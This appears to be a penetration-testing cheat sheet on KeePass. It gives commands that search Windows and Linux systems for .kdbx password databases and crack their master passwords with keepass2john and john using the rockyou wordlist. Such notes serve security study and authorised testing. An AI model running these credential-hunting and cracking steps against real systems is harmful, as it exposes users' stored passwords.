KeePass

KeePass is a free, open-source, and highly secure password manager that stores usernames and passwords in an encrypted local database, protected by a single master key

Finding database

    dir C:\*.kdbx /s /b 2>nul    #cmd
    Get-ChildItem -Path C:\ -Filter *.kdbx -Recurse -ErrorAction SilentlyContinue       #powershell
    find / -name "*.kdbx" 2>/dev/null            #bash

Cracking master password

    In case you know the password we can use keepassxc from our attacking machine

    keepassxc keepass_database.kdbx

    if not we can use john to crack the password. First convert the file

    keepass2john CEH.kdbx > keepassdatabase.txt

    Then attempt to crack

    john --wordlist=/usr/share/wordlists/rockyou.txt keepassdatabase.txt
